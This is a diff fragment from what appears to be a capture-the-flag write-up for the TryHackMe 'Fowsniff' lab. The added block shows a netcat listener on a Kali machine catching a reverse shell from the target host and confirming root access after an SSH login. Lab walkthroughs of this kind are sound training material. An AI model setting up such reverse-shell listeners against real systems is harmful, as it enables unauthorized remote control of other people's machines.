@@ -852,6 +852,16 @@ When we open a separate terminal and log in via SSH we should now get a reverse 
 └─# ssh baksteen@10.82.154.253
 baksteen@10.82.154.253's password: 
 ```
+
+```
+┌──(kali㉿kali)-[~/ET/THM/Fowsniff CTF]
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.134.50] from (UNKNOWN) [10.82.154.253] 50018
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+```
 <div>
 <br>
 <br>
